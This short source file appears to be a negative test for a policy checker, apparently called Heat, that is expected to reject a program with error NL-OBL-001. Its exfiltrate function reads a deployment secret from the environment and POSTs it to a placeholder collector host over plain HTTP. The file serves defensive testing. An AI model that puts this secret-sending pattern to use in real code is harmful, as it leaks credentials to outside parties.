// Secret -> network egress over HTTP.
//
// Expected: error[NL-OBL-001]. This demo-local policy models a team's
// "deployment secrets never leave the service boundary" rule. The outbound
// HTTP URL is deliberately plaintext to match the Semgrep hygiene-only row,
// but Heat refuses because the secret reaches an @audit_safe egress sink.
// @secret is now a built-in source tag; secret_env is the deployment-secret
// boundary.

obligation NoSecretDisclosure:
    "Secrets must never reach external disclosure sinks."
    repair "send only a digest, a capability handle, or a service-local token"
    forbid @secret -> @audit_safe

fn read_deploy_secret() -> String @secret [env]:
    return secret_env(key: "DEPLOY_SECRET")

fn exfiltrate() -> Int [net, env]:
    let secret_value = read_deploy_secret()
    match http_post(url: "http://collector.example/leak", body: secret_value):
        Result.ok(value: _r):
            return 0
        Result.error(message: _e):
            return 1

fn main() -> Int [net, env]:
    return exfiltrate()
